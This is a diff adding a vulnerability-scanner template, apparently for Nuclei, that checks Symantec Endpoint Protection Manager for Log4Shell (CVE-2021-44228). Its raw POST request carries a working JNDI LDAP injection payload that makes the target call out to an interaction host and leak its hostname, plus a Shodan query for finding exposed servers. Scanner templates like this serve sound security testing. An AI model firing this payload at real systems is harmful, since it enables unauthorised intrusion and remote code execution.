@@ -1,0 +1,63 @@
+http:
+    - extractors:
+        - kval:
+            - interactsh_ip
+          type: kval
+        - group: 2
+          part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+        - group: 1
+          part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+      matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - dns
+        - part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+      matchers-condition: and
+      raw:
+        - |
+          POST /console/apps/sepm HTTP/1.1
+          Host: {{Hostname}}
+          Cookie: cookieTest=true;
+          Origin: {{RootURL}}
+          Referer: {{RootURL}}/console/apps/sepm
+          X-Requested-With: XMLHttpRequest
+          Content-Type: application/x-www-form-urlencoded
+
+          actionString=%2Fnoupdate%2FSEPMPasswordField_{{field}}%2F&storedActions%5B%5D=%2Ftype%2FSEPMPasswordField_{{field}}%2F${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&__Action=v4&__FastSubmit=true
+id: symantec-sepm-log4j-rce
+info:
+    author: shaikhyaser
+    classification:
+        cve-id: CVE-2021-44228
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: |
+        Symantec SPEM is susceptible to Log4j JNDI remote code execution.
+    metadata:
+        max-request: 1
+        shodan-query: title:"Symantec Endpoint Protection Manager"
+    name: Symantec SEPM - Remote Code Execution (Apache Log4j)
+    reference:
+        - https://support.broadcom.com/security-advisory/content/security-advisories/Symantec-Security-Advisory-for-Log4j-2-CVE-2021-44228-Vulnerability/SYMSA19793
+    severity: critical
+    tags:
+        - jndi
+        - log4j
+        - symantec
+        - oast
+        - kev
+variables:
+    rand1: '{{rand_int(111, 999)}}'
+    rand2: '{{rand_int(111, 999)}}'
+    str: '{{rand_base(5)}}'
